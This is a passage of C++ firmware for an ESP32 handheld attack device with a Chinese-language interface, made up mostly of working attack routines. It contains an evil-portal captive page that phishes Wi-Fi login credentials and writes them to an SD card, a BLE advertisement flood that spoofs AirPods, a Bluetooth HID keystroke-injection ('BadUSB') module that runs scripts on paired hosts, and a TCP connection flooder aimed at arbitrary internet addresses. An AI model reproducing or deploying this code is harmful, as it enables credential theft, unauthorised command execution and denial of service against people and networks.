                    tft.setCursor(100, CONTENT_Y + 88);
                    tft.print(cur_id);
                    tft.print("/");
                    tft.print(beacon_count);
                    last_id = cur_id;
                }
                
                delay(30);
            }
            g_wifi_atk = ATK_OFF;
            buzzer_click();
            return;
        }
        delay(30);
    }
}

// ═══════════════ ATTACK: Evil Portal — anti-flicker ═══════════════
static DNSServer* dns_srv = nullptr;
static WebServer* web_srv = nullptr;

static const char* portal_html = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#ccc;font:14px sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#111;border:2px solid #333;border-radius:12px;padding:24px;text-align:center;width:320px}
h1{color:#0f0;margin-bottom:16px;font-size:1.3em}
input{width:100%;padding:10px;margin:6px 0;background:#222;border:1px solid #444;border-radius:6px;color:#0f0;font:14px monospace}
button{width:100%;padding:10px;margin-top:8px;background:#0f0;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer}
p{color:#666;font-size:0.8em;margin-top:12px}
</style></head>
<body>
<div class="box">
<h1>WiFi Login</h1>
<p>Please authenticate to continue</p>
<form method="POST" action="/login">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button type="submit">Login</button>
</form>
</div>
</body></html>
)rawliteral";

static void attk_portal() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free WiFi", "");
    g_wifi_mode = WM_AP;
    tft_soft_restore();  // WiFi doesn't use SPI MISO
    
    IPAddress ip = WiFi.softAPIP();
    
    dns_srv = new DNSServer();
    dns_srv->start(53, "*", ip);
    
    web_srv = new WebServer(80);
    web_srv->on("/", HTTP_GET, []() {
        web_srv->send(200, "text/html", portal_html);
    });
    web_srv->on("/login", HTTP_POST, []() {
        String u = web_srv->arg("user");
        String p = web_srv->arg("pass");
        Serial.printf("[PORTAL] User:%s Pass:%s\n", u.c_str(), p.c_str());
        sd_init();
        if (sd_ok) {
            File f = SD.open("/portal/creds.txt", FILE_APPEND);
            if (f) {
                f.println(u + ":" + p);
                f.close();
            }
        }
        web_srv->send(200, "text/html", "<h1>Logged in!</h1><p>Redirecting...</p><script>setTimeout(function(){window.location='https://google.com'},2000)</script>");
    });
    web_srv->onNotFound([]() {
        web_srv->sendHeader("Location", "/", true);
        web_srv->send(302, "text/plain", "");
    });
    web_srv->begin();
    
    g_wifi_atk = ATK_RUNNING;
    
    // Draw static layout once
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("邪恶门户");

    // Panel
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 60, C_DGRAY);
    tft.setTextFont(1);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(8, CONTENT_Y + 18);
    tft.print("SSID: Free WiFi");
    {
        int x = 8;
        x += cnfont_print(x, CONTENT_Y + 34, "门户IP:", C_WHITE, C_BLACK);
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(x, CONTENT_Y + 34);
        tft.print(ip.toString());
    }
    cnfont_print(8, CONTENT_Y + 50, "连接数:", C_WHITE, C_BLACK);

    cnfont_print(4, SCR_H - 16, "B:停止", C_RED, C_BLACK);
    
    int last_clients = -1;
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
        if (buttons_is_pressed(BTN_ID_B)) break;
        dns_srv->processNextRequest();
        web_srv->handleClient();
        
        // Only update client count when it changes
        int clients = WiFi.softAPgetStationNum();
        if (clients != last_clients) {
            if (clients > 0 && last_clients == 0) {
                buzzer_click();
            }
            tft.fillRect(62, CONTENT_Y + 50, 30, 10, C_BLACK);
            tft.setTextColor(clients > 0 ? C_YELLOW : C_DGRAY, C_BLACK);
            tft.setCursor(62, CONTENT_Y + 50);
            tft.print(clients);
            last_clients = clients;
        }
        delay(100);
    }
    
    web_srv->stop();
    dns_srv->stop();
    delete web_srv; web_srv = nullptr;
    delete dns_srv; dns_srv = nullptr;
    WiFi.softAPdisconnect(true);
    g_wifi_atk = ATK_OFF;
    g_wifi_mode = WM_OFF;
    buzzer_click();
}

// ═══════════════ ATTACK: BLE Spam — progress-bar visualization ═══════════════
static void attk_ble_spam() {
    NimBLEDevice::init("");
    g_ble_on = true;
    g_ble_atk = ATK_ARMED;
    tft_soft_restore();
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("蓝牙洪泛");

    // Info panel
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 60, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 18, "模式: 蓝牙洪泛", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 34, "目标:所有蓝牙设备", C_YELLOW, C_BLACK);
    cnfont_print(4, CONTENT_Y + 50, "伪装: AirPods(苹果)", C_DGRAY, C_BLACK);
    cnfont_print(4, CONTENT_Y + 66, "A:开始  B:返回", C_WHITE, C_BLACK);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            g_ble_atk = ATK_OFF;
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            g_ble_atk = ATK_RUNNING;
            
            // ── Dashboard layout ──
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
            scr_draw_title("蓝牙洪泛 [运行中]");
            tft.setTextFont(1);
            
            tft.setTextColor(0xFFE0, 0x0300);
            tft.setCursor(2, CONTENT_Y + 14);
            tft.print("BLE");
            tft.setTextColor(0x8410, 0x0300);
            tft.setCursor(26, CONTENT_Y + 14);
            tft.print("AirPods/Prox");
            
            TrafficGraph graph;
            graph.init();
            
            tft.drawFastHLine(2, CONTENT_Y + 60, SCR_W - 4, 0x1082);
            tft.setTextColor(0x8410, 0x0300);
            tft.setCursor(2, CONTENT_Y + 64);
            tft.print("ADV:");  // advertisements
            cnfont_print(2, CONTENT_Y + 76, "速率:", 0x8410, 0x0300);
            tft.setCursor(2, CONTENT_Y + 88);
            tft.print("DEV:");
            tft.setTextColor(0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 64, "总包:", 0xFFE0, 0x0300);
            tft.setCursor(60, CONTENT_Y + 76);
            tft.print("TYPE:");
            tft.setCursor(60, CONTENT_Y + 88);
            tft.print("ST:");

            cnfont_print(4, SCR_H - 16, "B:停止", 0xF800, 0x0300);
            
            uint32_t rate_last_cnt = g_ble_spam_cnt;
            uint32_t rate_last_ms = millis();
            uint32_t last_pps = 999, last_total = 999;
            NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
            
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
                if (buttons_is_pressed(BTN_ID_B)) break;
                char name[16];
                snprintf(name, 16, "AirPods %d", random(100, 999));
                NimBLEAdvertisementData data;
                data.setName(name);
                data.setManufacturerData("Apple");
                adv->setAdvertisementData(data);
                adv->start();
                delay(100);
                adv->stop();
                g_ble_spam_cnt++;
                
                uint32_t now_ms = millis();
                
                if (now_ms - rate_last_ms >= 500) {
                    uint32_t pps = (g_ble_spam_cnt - rate_last_cnt) * 2;
                    rate_last_cnt = g_ble_spam_cnt;
                    rate_last_ms = now_ms;
                    graph.push(pps);
                    graph.draw(20, CONTENT_Y + 26);
                    
                    if (pps != last_pps) {
                        tft.fillRect(42, CONTENT_Y + 76, 18, 8, 0x0300);
                        tft.setTextColor(pps > 15 ? 0xF800 : 0x07FF, 0x0300);
                        tft.setCursor(42, CONTENT_Y + 76);
                        tft.print(pps);
                        last_pps = pps;
                    }
                }
                
                if (g_ble_spam_cnt != last_total) {
                    tft.fillRect(100, CONTENT_Y + 64, 48, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 64);
                    tft.print(g_ble_spam_cnt);
                    last_total = g_ble_spam_cnt;
                    
                    // ADV count
                    tft.fillRect(28, CONTENT_Y + 64, 44, 8, 0x0300);
                    tft.setTextColor(0x07FF, 0x0300);
                    tft.setCursor(28, CONTENT_Y + 64);
                    tft.print(g_ble_spam_cnt);
                }
            }
            g_ble_atk = ATK_OFF;
            NimBLEDevice::deinit(false);
            g_ble_on = false;
            buzzer_click();
            return;
        }
        delay(20);
    }
}

// ═══════════════ ATTACK: BLE BadUSB (HID Keyboard Injection) ═══════════════
// Uses NimBLE HID to impersonate a Bluetooth keyboard

// USB HID key codes
static const uint8_t HID_MOD_CTRL = 0x01;
static const uint8_t HID_MOD_SHIFT = 0x02;
static const uint8_t HID_MOD_ALT = 0x04;
static const uint8_t HID_MOD_GUI = 0x08;

static void badusb_press_key(uint8_t mod, uint8_t key, NimBLECharacteristic* input) {
    uint8_t report[8] = {mod, 0, key, 0, 0, 0, 0, 0};
    input->setValue(report, 8);
    input->notify();
    delay(5);
    // Release
    uint8_t release[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    input->setValue(release, 8);
    input->notify();
    delay(5);
}

static void badusb_type_string(const String& text, NimBLECharacteristic* input) {
    for (size_t i = 0; i < text.length(); i++) {
        char c = text[i];
        uint8_t mod = 0;
        uint8_t key = 0;
        
        if (c >= 'a' && c <= 'z') { key = 0x04 + (c - 'a'); }
        else if (c >= 'A' && c <= 'Z') { mod = HID_MOD_SHIFT; key = 0x04 + (c - 'A'); }
        else if (c >= '1' && c <= '9') { key = 0x1E + (c - '1'); }
        else if (c == '0') { key = 0x27; }
        else if (c == ' ') { key = 0x2C; }
        else if (c == '\n' || c == '\r') { key = 0x28; }
        else if (c == '-') { key = 0x2D; }
        else if (c == '=') { key = 0x2E; }
        else if (c == '[') { key = 0x2F; }
        else if (c == ']') { key = 0x30; }
        else if (c == '\\') { key = 0x31; }
        else if (c == ';') { key = 0x33; }
        else if (c == '\'') { key = 0x34; }
        else if (c == ',') { key = 0x36; }
        else if (c == '.') { key = 0x37; }
        else if (c == '/') { key = 0x38; }
        else if (c == '`') { key = 0x35; }
        else { key = 0x2C; } // space for unknown
        
        badusb_press_key(mod, key, input);
        delay(10);
    }
}

// HID keyboard report descriptor
static const uint8_t hidReportDesc[] = {
    0x05, 0x01,        // Usage Page (Generic Desktop)
    0x09, 0x06,        // Usage (Keyboard)
    0xA1, 0x01,        // Collection (Application)
    0x85, 0x01,        //   Report ID (1)
    0x05, 0x07,        //   Usage Page (Keyboard)
    0x19, 0xE0,        //   Usage Minimum (224)
    0x29, 0xE7,        //   Usage Maximum (231)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x01,        //   Logical Maximum (1)
    0x75, 0x01,        //   Report Size (1)
    0x95, 0x08,        //   Report Count (8)
    0x81, 0x02,        //   Input (Data, Variable, Absolute) - Modifier keys
    0x95, 0x01,        //   Report Count (1)
    0x75, 0x08,        //   Report Size (8)
    0x81, 0x01,        //   Input (Constant) - Reserved byte
    0x95, 0x06,        //   Report Count (6)
    0x75, 0x08,        //   Report Size (8)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x65,        //   Logical Maximum (101)
    0x05, 0x07,        //   Usage Page (Keyboard)
    0x19, 0x00,        //   Usage Minimum (0)
    0x29, 0x65,        //   Usage Maximum (101)
    0x81, 0x00,        //   Input (Data, Array) - Key arrays
    0xC0               // End Collection
};

static void attk_badusb() {
    // Deinit NimBLE if active (BLE spam uses it)
    if (g_ble_on) {
        NimBLEDevice::deinit(false);
        g_ble_on = false;
    }
    g_ble_atk = ATK_OFF;
    
    tft_soft_restore();
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("蓝牙坏键盘");

    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 70, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 18, "模式: HID注入", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 34, "目标:已配对蓝牙主机", C_YELLOW, C_BLACK);
    cnfont_print(4, CONTENT_Y + 50, "名称: 小喵键盘", C_DGRAY, C_BLACK);
    cnfont_print(4, CONTENT_Y + 66, "A:开始  B:停止", C_WHITE, C_BLACK);
    cnfont_print(4, SCR_H - 16, "B:停止", C_RED, C_BLACK);
    
    // Create NimBLE HID keyboard server
    NimBLEServer* pServer = NimBLEDevice::createServer();
    NimBLEHIDDevice* hid = new NimBLEHIDDevice(pServer);
    
    // Setup HID keyboard
    hid->setManufacturer("XiaoMiao");
    hid->setPnp(0x02, 0xE502, 0xA111, 0x0210);
    hid->setHidInfo(0x00, 0x01);
    hid->setReportMap((uint8_t*)hidReportDesc, sizeof(hidReportDesc));
    
    NimBLECharacteristic* input = hid->getInputReport(1);
    if (!input) {
        Serial.println("[BadUSB] ERROR: getInputReport returned null!");
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("蓝牙坏键盘");
        cnfont_print(4, CONTENT_Y + 20, "HID初始化失败!", C_RED, C_BLACK);
        delay(2000);
        delete hid;
        NimBLEDevice::deinit(false);
        g_ble_on = false;
        return;
    }
    
    // Start advertising
    NimBLEAdvertising* pAdv = pServer->getAdvertising();
    pAdv->setAppearance(HID_KEYBOARD);
    pAdv->addServiceUUID(hid->getHidService()->getUUID());
    pAdv->start();
    
    g_ble_on = true;
    
    bool connected = false;
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_is_pressed(BTN_ID_B)) break;
        
        if (pServer->getConnectedCount() > 0 && !connected) {
            connected = true;
            buzzer_click();
            tft.fillRect(2, CONTENT_Y + 14, SCR_W - 4, 70, C_BLACK);
            cnfont_print(8, CONTENT_Y + 20, "状态: 已连接!", C_GREEN, C_BLACK);
            cnfont_print(8, CONTENT_Y + 40, "A:运行脚本 B:停止", C_YELLOW, C_BLACK);
        }
        
        if (connected && buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            // Read script from SD
            String script = "";
            sd_init();
            if (sd_ok && SD.exists("/badusb_script.txt")) {
                File f = SD.open("/badusb_script.txt");
                script = f.readString();
                f.close();
                script.trim();
            }
            
            if (script.length() == 0) {
                // Default demo script: Win+R, type notepad, type "Hello from XiaoMiao!"
                tft.fillRect(8, CONTENT_Y + 40, SCR_W - 16, 16, C_BLACK);
                cnfont_print(8, CONTENT_Y + 40, "运行演示...", C_CYAN, C_BLACK);
                
                delay(1000);
                // Win+R
                badusb_press_key(HID_MOD_GUI, 0x15, input); // GUI+R
                delay(1000);
                // Type "notepad"
                badusb_type_string("notepad", input);
                delay(300);
                badusb_press_key(0, 0x28, input); // Enter
                delay(1000);
                // Type message
                badusb_type_string("Hello from XiaoMiaoOS!", input);
                badusb_press_key(0, 0x28, input); // Enter
                badusb_type_string("BLE BadUSB attack successful!", input);
                
                tft.fillRect(8, CONTENT_Y + 40, SCR_W - 16, 16, C_BLACK);
                cnfont_print(8, CONTENT_Y + 40, "完成!  B:停止", C_GREEN, C_BLACK);
            } else {
                // Parse and execute script
                tft.fillRect(8, CONTENT_Y + 40, SCR_W - 16, 16, C_BLACK);
                cnfont_print(8, CONTENT_Y + 40, "运行脚本...", C_CYAN, C_BLACK);
                
                // Split by comma
                int pos = 0;
                while (pos < script.length()) {
                    int comma = script.indexOf(',', pos);
                    if (comma < 0) comma = script.length();
                    String cmd = script.substring(pos, comma);
                    cmd.trim();
                    pos = comma + 1;
                    
                    if (cmd.startsWith("STRING:")) {
                        String text = cmd.substring(7);
                        badusb_type_string(text, input);
                    } else if (cmd.startsWith("DELAY:")) {
                        int ms = cmd.substring(6).toInt();
                        delay(ms > 0 ? ms : 500);
                    } else if (cmd == "ENTER") {
                        badusb_press_key(0, 0x28, input);
                    } else if (cmd == "TAB") {
                        badusb_press_key(0, 0x2B, input);
                    } else if (cmd == "ESC") {
                        badusb_press_key(0, 0x29, input);
                    } else if (cmd.startsWith("GUI ")) {
                        String k = cmd.substring(4);
                        k.trim();
                        if (k.length() > 0) badusb_press_key(HID_MOD_GUI, tolower(k[0]) - 'a' + 0x04, input);
                    } else if (cmd.startsWith("CTRL ")) {
                        String k = cmd.substring(5);
                        k.trim();
                        if (k.length() > 0) badusb_press_key(HID_MOD_CTRL, tolower(k[0]) - 'a' + 0x04, input);
                    } else if (cmd.startsWith("ALT ")) {
                        String k = cmd.substring(4);
                        k.trim();
                        if (k.length() > 0) badusb_press_key(HID_MOD_ALT, tolower(k[0]) - 'a' + 0x04, input);
                    }
                    
                    if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
                }
                
                tft.fillRect(8, CONTENT_Y + 40, SCR_W - 16, 16, C_BLACK);
                cnfont_print(8, CONTENT_Y + 40, "脚本完成! B:停止", C_GREEN, C_BLACK);
            }
        }
        
        delay(50);
    }
    
    // Cleanup
    pAdv->stop();
    delete hid;
    NimBLEDevice::deinit(false);
    g_ble_on = false;
    buzzer_click();
}

// ═══════════════ ATTACK: Defense ═══════════════
static void attk_defense() {
    if (g_wifi_mode == WM_OFF) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        g_wifi_mode = WM_STA;
        tft_soft_restore();
    }
    
    g_wifi_def = ATK_ARMED;
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("防御护盾");

    // Info panel
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 60, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 18, "模式: 防御监控", C_CYAN, C_BLACK);
    cnfont_print(4, CONTENT_Y + 34, "目标:所有WiFi流量", C_YELLOW, C_BLACK);
    cnfont_print(4, CONTENT_Y + 50, "拦截: 断连/解除关联", C_DGRAY, C_BLACK);
    cnfont_print(4, CONTENT_Y + 66, "A:开始  B:返回", C_WHITE, C_BLACK);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            g_wifi_def = ATK_OFF;
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            g_wifi_def = ATK_RUNNING;
            
            // ── Dashboard layout ──
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
            scr_draw_title("防御护盾 [运行中]");
            tft.setTextFont(1);
            
            tft.setTextColor(0x07FF, 0x0300);  // cyan
            tft.setCursor(2, CONTENT_Y + 14);
            tft.print("DEF");
            tft.setTextColor(0x8410, 0x0300);
            tft.setCursor(26, CONTENT_Y + 14);
            tft.print("Mon:All CH");
            
            TrafficGraph graph;
            graph.init();
            
            tft.drawFastHLine(2, CONTENT_Y + 60, SCR_W - 4, 0x1082);
            tft.setTextColor(0x8410, 0x0300);
            cnfont_print(2, CONTENT_Y + 64, "信道:", 0x8410, 0x0300);
            cnfont_print(2, CONTENT_Y + 76, "速率:", 0x8410, 0x0300);
            tft.setCursor(2, CONTENT_Y + 88);
            tft.print("RX:");
            tft.setTextColor(0xFFE0, 0x0300);
            cnfont_print(60, CONTENT_Y + 64, "拦截:", 0xFFE0, 0x0300);
            tft.setCursor(60, CONTENT_Y + 76);
            tft.print("DET:");
            tft.setCursor(60, CONTENT_Y + 88);
            tft.print("ST:");

            cnfont_print(4, SCR_H - 16, "B:停止", 0xF800, 0x0300);
            
            uint32_t blocked_last = 0;
            uint32_t detected_last = 0;
            uint32_t rate_last_ms = millis();
            uint32_t last_pps = 999, last_blk = 999, last_det = 999, last_ch = 99, last_rx = 999;
            int cur_ch = 1;
            
            // Set promiscuous mode to sniff all packets
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
                if (type == WIFI_PKT_MGMT && buf) {
                    wifi_promiscuous_pkt_t* ppkt = (wifi_promiscuous_pkt_t*)buf;
                    uint8_t* frame = ppkt->payload;
                    uint8_t frame_type = frame[0];
                    if (frame_type == 0xC0 || frame_type == 0xA0) {
                        g_packets_blocked++;
                    }
                    g_traffic_rx++;
                }
            });
            
            int ch = 1;
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
                if (buttons_is_pressed(BTN_ID_B)) break;
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                cur_ch = ch;
                ch++;
                if (ch > 13) ch = 1;
                
                uint32_t ms = millis();
                
                // Channel
                if (cur_ch != last_ch) {
                    tft.fillRect(42, CONTENT_Y + 64, 18, 8, 0x0300);
                    tft.setTextColor(0x07FF, 0x0300);
                    tft.setCursor(42, CONTENT_Y + 64);
                    tft.print(cur_ch);
                    last_ch = cur_ch;
                }
                
                // RX
                if (g_traffic_rx != last_rx) {
                    tft.fillRect(28, CONTENT_Y + 88, 44, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(28, CONTENT_Y + 88);
                    tft.print(g_traffic_rx);
                    last_rx = g_traffic_rx;
                }
                
                // Blocked
                if (g_packets_blocked != last_blk) {
                    tft.fillRect(100, CONTENT_Y + 64, 48, 8, 0x0300);
                    tft.setTextColor(g_packets_blocked > 0 ? 0xF800 : 0x07E0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 64);
                    tft.print(g_packets_blocked);
                    last_blk = g_packets_blocked;
                    
                    if (g_packets_blocked > blocked_last + 10) {
                        buzzer_click();
                    }
                    blocked_last = g_packets_blocked;
                }
                
                // Detected (total RX)
                if (g_traffic_rx != last_det) {
                    tft.fillRect(100, CONTENT_Y + 76, 48, 8, 0x0300);
                    tft.setTextColor(0xFFE0, 0x0300);
                    tft.setCursor(100, CONTENT_Y + 76);
                    tft.print(g_traffic_rx);
                    last_det = g_traffic_rx;
                }
                
                // PPS + graph every 500ms
                if (ms - rate_last_ms >= 500) {
                    uint32_t pps = (g_packets_blocked - detected_last) * 2;
                    detected_last = g_packets_blocked;
                    rate_last_ms = ms;
                    graph.push(pps);
                    graph.draw(20, CONTENT_Y + 26);
                    
                    if (pps != last_pps) {
                        tft.fillRect(42, CONTENT_Y + 76, 18, 8, 0x0300);
                        tft.setTextColor(pps > 10 ? 0xF800 : 0x07FF, 0x0300);
                        tft.setCursor(42, CONTENT_Y + 76);
                        tft.print(pps);
                        last_pps = pps;
                    }
                }
                
                delay(50);
            }
            
            esp_wifi_set_promiscuous(false);
            g_wifi_def = ATK_OFF;
            buzzer_click();
            return;
        }
        delay(30);
    }
}

// ═══════════════ ATTACK: TCP Flood — target IP/Port (external attack) ═══════════════
// Sends rapid TCP connection floods to any reachable IP:port (LAN or WAN)
static void attk_tcp_flood() {
    // Step 1: Input target IP and port
    char target_ip[16] = "";
    int target_port = 80;
    
    if (!input_ip_port(target_ip, &target_port)) {
        return;  // User cancelled
    }
    
    // Step 2: Ensure WiFi is connected (needed for TCP)
    if (g_wifi_mode != WM_STA || WiFi.status() != WL_CONNECTED) {
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
        scr_draw_title("TCP洪泛");
        tft.setTextFont(1);
        cnfont_print(4, CONTENT_Y + 20, "WiFi未连接!", 0xF800, 0x0300);
        cnfont_print(4, CONTENT_Y + 38, "请先连接WiFi", 0x8410, 0x0300);
        cnfont_print(4, CONTENT_Y + 56, "通过WebUI设置", 0x8410, 0x0300);
        cnfont_print(4, SCR_H - 16, "B:返回", 0xF800, 0x0300);
        while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(30);
        return;
    }
    
    // Step 3: Armed phase
    g_wifi_atk = ATK_ARMED;
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
    scr_draw_title("TCP洪泛");
    tft.setTextFont(1);

    cnfont_print(2, CONTENT_Y + 16, "模式: TCP SYN洪泛", 0x07FF, 0x0300);
    {
        int x = 2;
        x += cnfont_print(x, CONTENT_Y + 34, "目标IP:", 0xFFE0, 0x0300);
        tft.setTextColor(0xFFFF, 0x0300);
        tft.setCursor(x, CONTENT_Y + 34);
        tft.print(target_ip);
    }
    {
        int x = 2;
        x += cnfont_print(x, CONTENT_Y + 52, "端口:", 0xFFE0, 0x0300);
        tft.setTextColor(0xFFFF, 0x0300);
        tft.setCursor(x, CONTENT_Y + 52);
        tft.print(target_port);
    }
    cnfont_print(2, CONTENT_Y + 70, "支持外网IP", 0x8410, 0x0300);
    cnfont_print(2, CONTENT_Y + 90, "A:开始  B:返回", 0xFFFF, 0x0300);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            g_wifi_atk = ATK_OFF;
            buzzer_click();
            return;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            break;
        }
        delay(30);
    }
    
    // Step 4: Running phase with dashboard visualization
    g_wifi_atk = ATK_RUNNING;
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, 0x0300);
    scr_draw_title("TCP洪泛 [运行中]");
    tft.setTextFont(1);
    
    // Top info
    tft.setTextColor(0xFFE0, 0x0300);
    tft.setCursor(2, CONTENT_Y + 14);
    tft.print("TCP");
    tft.setTextColor(0x8410, 0x0300);
    tft.setCursor(24, CONTENT_Y + 14);
    // Show compact IP:port
    tft.print(target_ip);
    tft.print(":");
    tft.print(target_port);
    
    // Traffic graph
    TrafficGraph graph;
    graph.init();
    
    // Bottom readouts
    tft.drawFastHLine(2, CONTENT_Y + 60, SCR_W - 4, 0x1082);
    cnfont_print(2, CONTENT_Y + 64, "速率:", 0x8410, 0x0300);
    cnfont_print(2, CONTENT_Y + 76, "错误:", 0x8410, 0x0300);
    cnfont_print(2, CONTENT_Y + 88, "传输:", 0x8410, 0x0300);
    cnfont_print(60, CONTENT_Y + 64, "总数:", 0xFFE0, 0x0300);
    tft.setTextColor(0xFFE0, 0x0300);
    tft.setCursor(60, CONTENT_Y + 76);
    tft.print("IP:");
    cnfont_print(60, CONTENT_Y + 88, "端口:", 0xFFE0, 0x0300);
    
    cnfont_print(4, SCR_H - 16, "B:停止", 0xF800, 0x0300);
    
    uint32_t tcp_count = 0;
    uint32_t tcp_errors = 0;
    uint32_t tcp_bytes = 0;
    uint32_t rate_last_cnt = 0;
    uint32_t rate_last_ms = millis();
    uint32_t last_cps = 999, last_con = 999, last_kb = 99, last_err = 999;
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
        if (buttons_is_pressed(BTN_ID_B)) break;
        
        // Fire TCP connections
        for (int i = 0; i < 5; i++) {
            if (buttons_is_pressed(BTN_ID_B)) break;
            WiFiClient client;
            client.setTimeout(500);  // 500ms timeout — was 2s causing watchdog issues
            if (client.connect(target_ip, target_port, 1)) {  // 1s connect timeout
                // Send junk data to keep connection busy
                int sent = client.write("XXXXXXXXXXXXXXXXXXXX", 20);  // 20 bytes per connection
                tcp_bytes += sent + 64;  // data + approximate TCP overhead
                client.stop();
                tcp_count++;
            } else {
                tcp_errors++;
            }
            yield();  // Feed watchdog between connections
        }
        
        uint32_t now_ms = millis();
        
        // Update graph + readouts every 500ms
        if (now_ms - rate_last_ms >= 500) {
            uint32_t cps = (tcp_count - rate_last_cnt) * 2;
            rate_last_cnt = tcp_count;
            rate_last_ms = now_ms;
            
            graph.push(cps);
            graph.draw(20, CONTENT_Y + 26);
            
            if (cps != last_cps) {
                tft.fillRect(42, CONTENT_Y + 64, 18, 8, 0x0300);
                tft.setTextColor(cps > 50 ? 0xF800 : 0x07FF, 0x0300);
                tft.setCursor(42, CONTENT_Y + 64);
                tft.print(cps);
                last_cps = cps;
            }
        }
        
        // Total connections
        if (tcp_count != last_con) {
            tft.fillRect(100, CONTENT_Y + 64, 48, 8, 0x0300);
            tft.setTextColor(0xFFE0, 0x0300);
            tft.setCursor(100, CONTENT_Y + 64);
            tft.print(tcp_count);
            last_con = tcp_count;
            
            // KB sent
            tft.fillRect(42, CONTENT_Y + 88, 18, 8, 0x0300);
            tft.setTextColor(0xFFE0, 0x0300);
            tft.setCursor(42, CONTENT_Y + 88);
            tft.print(tcp_bytes / 1024);
            last_kb = tcp_bytes / 1024;
        }
        
        // Errors
        if (tcp_errors != last_err) {
            tft.fillRect(42, CONTENT_Y + 76, 18, 8, 0x0300);
            tft.setTextColor(tcp_errors > 0 ? 0xF800 : 0x07E0, 0x0300);
            tft.setCursor(42, CONTENT_Y + 76);
            tft.print(tcp_errors);
            last_err = tcp_errors;
        }
        
        delay(10);
    }
    
    g_wifi_atk = ATK_OFF;
    buzzer_click();
}

// ═══════════════ TRAFFIC MONITOR — Data Cockpit visualization ═══════════════
static void net_traffic_mon() {
    tft_soft_restore();
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("流量监控");
    
    // Panel
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 56, C_DGRAY);
    tft.setTextFont(1);
    
    // ── Total Packets info ──
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(8, CONTENT_Y + 18);
    tft.print("TX:");
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(28, CONTENT_Y + 18);
    tft.print(g_packets_sent + g_beacons_sent);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(80, CONTENT_Y + 18);
    tft.print("RX:");
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(100, CONTENT_Y + 18);
    tft.print(g_traffic_rx);
    
    // ── DL progress bar ──
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(8, CONTENT_Y + 30);
    tft.print("DL");
    tft.drawRect(28, CONTENT_Y + 30, 88, 7, C_DGRAY);
